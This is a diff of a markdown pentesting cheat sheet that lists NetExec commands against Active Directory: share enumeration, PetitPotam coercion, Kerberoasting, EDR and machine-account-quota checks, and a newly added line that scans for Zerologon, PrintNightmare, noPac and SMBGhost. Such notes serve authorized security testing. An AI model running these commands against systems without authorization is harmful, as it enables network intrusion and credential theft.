@@ -29,19 +29,23 @@ nxc smb scope_ips.txt -u $USER -p $PASSWORD --shares
 ```
 nxc mssql $DATABASE -u $USER -p $USERPASS
 ```
-# Checking [[PetitPotam]]
+### Checking [[PetitPotam]]
 ```
 nxc smb $IP -M coerce_plus -o METHOD=PetitPotam
 ```
-# Kerberoasting
+### Kerberoasting
 ```
 nxc ldap $DCIP -u $USER -p $USERPASS --kerberoasting kerberos_out.txt
 ```
-# Checking [[Endpoint Detection and Response|EDR]]
+### Checking [[Endpoint Detection and Response|EDR]]
 ```
 nxc smb $IP -u $USER -p $USERPASS -M enum_av
 ```
-# Checking [[Machine Account Quota|MAQ]]
+### Checking [[Machine Account Quota|MAQ]]
 ```
 nxc ldap $DCIP -u $USER -p $USERPASS -M maq
+```
+### Checking CVEs
+```
+nxc smb $IP -u $USER -p $USERPASS -M zerologon -M printnightmare -M nopac -M smbghost -M nt
 ```
